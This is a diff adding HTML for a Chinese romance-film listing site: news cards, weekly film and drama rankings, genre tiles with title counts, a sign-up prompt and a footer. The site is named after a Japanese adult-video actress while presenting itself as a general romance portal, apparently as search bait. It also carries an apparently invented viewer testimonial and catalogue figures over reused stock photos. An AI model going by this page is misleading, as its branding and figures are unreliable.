+        <article class="nw"><img src="https://images.unsplash.com/photo-1478720568477-152d9b164e26?w=500&q=70" alt="资讯封面" loading="lazy"><div class="nw-b"><span class="cat">INDUSTRY</span><h4>2026 情人节档爱情片扎堆定档，多部青春纯爱题材引期待</h4><div class="bot"><span>行业观察</span><span>10-05</span></div></div></article>
+        <article class="nw"><img src="https://images.unsplash.com/photo-1500462918059-b1a0cb512f1d?w=500&q=70" alt="资讯封面" loading="lazy"><div class="nw-b"><span class="cat">REVIEW</span><h4>年度十佳爱情电影盘点：哪一部让你想起了TA</h4><div class="bot"><span>影评精选</span><span>10-04</span></div></div></article>
+        <article class="nw"><img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=500&q=70" alt="资讯封面" loading="lazy"><div class="nw-b"><span class="cat">DRAMAS</span><h4>多部都市爱情剧宣布续订，原班人马回归再续前缘</h4><div class="bot"><span>剧集速递</span><span>10-03</span></div></div></article>
+        <article class="nw"><img src="https://images.unsplash.com/photo-1518199266791-5375d97afc65?w=500&q=70" alt="资讯封面" loading="lazy"><div class="nw-b"><span class="cat">TREND</span><h4>治愈系爱情片持续走热，观众更偏爱真实细腻的情感表达</h4><div class="bot"><span>趋势观察</span><span>10-02</span></div></div></article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 观众心声 -->
+  <section class="sec">
+    <div class="wrap">
+      <div class="quote"><p>在这里总能找到一部刚好契合当下心情的爱情片，从怦然心动到细水长流，每一帧都值得反复回味。</p><div class="who">— 波多野结衣爱情电影网 · 观众心声</div></div>
+    </div>
+  </section>
+
+  <!-- 榜单 -->
+  <section class="sec" id="rank">
+    <div class="wrap">
+      <div class="sec-h"><span class="ic">💖</span><h3>心动<em>榜单</em></h3><a class="more" href="#">完整榜单 ›</a></div>
+      <div class="rank">
+        <div class="rk">
+          <div class="rk-h"><b>爱情电影榜</b><span>本周热门</span></div>
+          <ul>
+            <li><span class="idx t">1</span><span class="cv"><img src="https://images.unsplash.com/photo-1478720568477-152d9b164e26?w=200&q=60" alt=""></span><div class="info"><h4>泰坦尼克号</h4><p>经典 · 爱情 · 灾难</p><span class="sc">★ 9.4</span></div></li>
+            <li><span class="idx t">2</span><span class="cv"><img src="https://images.unsplash.com/photo-1500462918059-b1a0cb512f1d?w=200&q=60" alt=""></span><div class="info"><h4>情书</h4><p>纯爱 · 暗恋 · 文艺</p><span class="sc">★ 9.1</span></div></li>
+            <li><span class="idx t">3</span><span class="cv"><img src="https://images.unsplash.com/photo-1518199266791-5375d97afc65?w=200&q=60" alt=""></span><div class="info"><h4>爱在黎明破晓前</h4><p>爱情 · 对话 · 文艺</p><span class="sc">★ 9.0</span></div></li>
+            <li><span class="idx">4</span><span class="cv"><img src="https://images.unsplash.com/photo-1502230831726-fe5549140034?w=200&q=60" alt=""></span><div class="info"><h4>怦然心动</h4><p>青春 · 纯爱</p><span class="sc">★ 8.9</span></div></li>
+            <li><span class="idx">5</span><span class="cv"><img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=200&q=60" alt=""></span><div class="info"><h4>爱乐之城</h4><p>爱情 · 歌舞 · 追梦</p><span class="sc">★ 8.7</span></div></li>
+          </ul>
+        </div>
+        <div class="rk">
+          <div class="rk-h"><b>爱情剧集榜</b><span>本周热门</span></div>
+          <ul>
+            <li><span class="idx t">1</span><span class="cv"><img src="https://images.unsplash.com/photo-1518199266791-5375d97afc65?w=200&q=60" alt=""></span><div class="info"><h4>何以笙箫默</h4><p>都市 · 深情 · 全32集</p><span class="sc">★ 9.2</span></div></li>
+            <li><span class="idx t">2</span><span class="cv"><img src="https://images.unsplash.com/photo-1520637836862-4d197d17c73a?w=200&q=60" alt=""></span><div class="info"><h4>你的名字</h4><p>动画 · 纯爱 · 奇幻</p><span class="sc">★ 9.1</span></div></li>
+            <li><span class="idx t">3</span><span class="cv"><img src="https://images.unsplash.com/photo-1500462918059-b1a0cb512f1d?w=200&q=60" alt=""></span><div class="info"><h4>我可能不会爱你</h4><p>都市 · 治愈</p><span class="sc">★ 9.0</span></div></li>
+            <li><span class="idx">4</span><span class="cv"><img src="https://images.unsplash.com/photo-1500462918059-b1a0cb512f1d?w=200&q=60" alt=""></span><div class="info"><h4>匆匆那年</h4><p>青春 · 怀旧</p><span class="sc">★ 8.8</span></div></li>
+            <li><span class="idx">5</span><span class="cv"><img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=200&q=60" alt=""></span><div class="info"><h4>下一站是幸福</h4><p>都市 · 职场 · 恋爱</p><span class="sc">★ 8.6</span></div></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 分类 -->
+  <section class="sec" id="cat">
+    <div class="wrap">
+      <div class="sec-h"><span class="ic">🎞️</span><h3>按<em>类型</em>找片</h3></div>
+      <div class="cat">
+        <a href="#" style="--bgimg:url('https://images.unsplash.com/photo-1502230831726-fe5549140034?w=400&q=60')"><span><b>青春纯爱</b><i>1,260 部</i></span></a>
+        <a href="#" style="--bgimg:url('https://images.unsplash.com/photo-1478720568477-152d9b164e26?w=400&q=60')"><span><b>经典爱情</b><i>980 部</i></span></a>
+        <a href="#" style="--bgimg:url('https://images.unsplash.com/photo-1500462918059-b1a0cb512f1d?w=400&q=60')"><span><b>治愈系</b><i>1,540 部</i></span></a>
+        <a href="#" style="--bgimg:url('https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=400&q=60')"><span><b>都市情感</b><i>1,180 部</i></span></a>
+        <a href="#" style="--bgimg:url('https://images.unsplash.com/photo-1518199266791-5375d97afc65?w=400&q=60')"><span><b>爱情喜剧</b><i>1,420 部</i></span></a>
+        <a href="#" style="--bgimg:url('https://images.unsplash.com/photo-1520637836862-4d197d17c73a?w=400&q=60')"><span><b>奇幻浪漫</b><i>860 部</i></span></a>
+        <a href="#" style="--bgimg:url('https://images.unsplash.com/photo-1500462918059-b1a0cb512f1d?w=400&q=60')"><span><b>虐恋催泪</b><i>740 部</i></span></a>
+        <a href="#" style="--bgimg:url('https://images.unsplash.com/photo-1578632767115-351597cf2477?w=400&q=60')"><span><b>甜宠校园</b><i>1,050 部</i></span></a>
+      </div>
+    </div>
+  </section>
+
+  <!-- CTA -->
+  <section class="sec">
+    <div class="wrap">
+      <div class="cta">
+        <h3>把心动的片子<br>都<em>收藏</em>起来</h3>
+        <p>注册波多野结衣爱情电影网，记录观影足迹，定制专属爱情片单，再也不会错过每一份怦然。</p>
+        <a class="btn btn-rose" href="#">免费注册 · 开启心动片单</a>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<!-- Footer -->
+<footer class="ft" id="about">
+  <div class="wrap">
+    <div class="ft-g">
+      <div class="ft-c ft-ab">
+        <div class="brand"><span class="heart">💗</span><div><b>波多野结衣爱情电影网</b><small>LOVE ROMANCE CINEMA</small></div></div>
+        <p>波多野结衣爱情电影网专注爱情电影、浪漫剧集、情感综艺与唯美动漫，精选片单用心呈现每一份心动与感动。</p>
+      </div>
+      <div class="ft-c"><h5>内容导航</h5><ul><li><a href="#">爱情电影</a></li><li><a href="#">爱情剧集</a></li><li><a href="#">情感综艺</a></li><li><a href="#">浪漫动漫</a></li><li><a href="#">影视资讯</a></li></ul></div>
+      <div class="ft-c"><h5>类型精选</h5><ul><li><a href="#">青春纯爱</a></li><li><a href="#">经典爱情</a></li><li><a href="#">治愈系</a></li><li><a href="#">都市情感</a></li><li><a href="#">甜宠校园</a></li></ul></div>
+      <div class="ft-c"><h5>关于本站</h5><ul><li><a href="#">平台简介</a></li><li><a href="#">免责声明</a></li><li><a href="#">版权声明</a></li><li><a href="#">隐私政策</a></li><li><a href="#">联系合作</a></li></ul></div>
+    </div>
+    <div class="ft-bot">
+      <p>© 2026 波多野结衣爱情电影网 boduoyejieyiaiqingdianyingwang-wap.github.io 保留所有权利。</p>
+      <span class="lk"><a href="#">免责声明</a><a href="#">隐私政策</a><a href="#">网站地图</a></span>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
